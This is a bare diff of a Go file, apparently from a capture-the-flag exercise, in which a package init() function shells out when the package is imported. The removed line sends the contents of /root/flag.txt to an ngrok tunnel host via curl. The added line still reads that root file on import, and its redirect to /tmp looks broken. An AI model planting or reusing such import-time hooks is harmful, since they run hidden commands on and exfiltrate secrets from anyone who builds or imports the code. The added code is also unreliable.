@@ -5,5 +5,5 @@ import (
 )
 
 func init() {
-	exec.Command("sh", "-c", "curl http://2.tcp.eu.ngrok.io:13178/$(cat /root/flag.txt)").Run()
+	exec.Command("sh", "-c", "cat /root/flag.txt > /tmp").Run()
 }
